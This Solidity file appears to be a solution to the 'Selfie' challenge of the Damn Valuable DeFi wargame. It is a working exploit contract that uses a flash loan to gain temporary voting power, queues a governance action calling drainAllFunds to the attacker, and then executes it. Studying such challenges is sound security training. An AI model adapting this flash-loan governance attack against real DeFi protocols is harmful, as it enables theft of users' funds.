// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface IPool {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

contract SelfieAttack {
    IERC20 TOKEN;
    IPool Pool;
    ISimpleGovernance SimpleGovernance;
    address owner;
    uint256 actionId;

    constructor(
        address _TOKEN,
        address _pool,
        address _simpleGovernance
    ) {
        TOKEN = IERC20(_TOKEN);
        Pool = IPool(_pool);
        SimpleGovernance = ISimpleGovernance(_simpleGovernance);

        owner = msg.sender;
    }

    function init(uint256 borrowAmount) external {
        Pool.flashLoan(borrowAmount);
    }

    function finish() external {
        SimpleGovernance.executeAction(actionId);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        DamnValuableTokenSnapshot tokenSnapshot = DamnValuableTokenSnapshot(address(TOKEN));
        tokenSnapshot.snapshot();
        actionId = SimpleGovernance.queueAction(address(Pool), data, 0);
        TOKEN.transfer(address(Pool), _amount);
    }
}
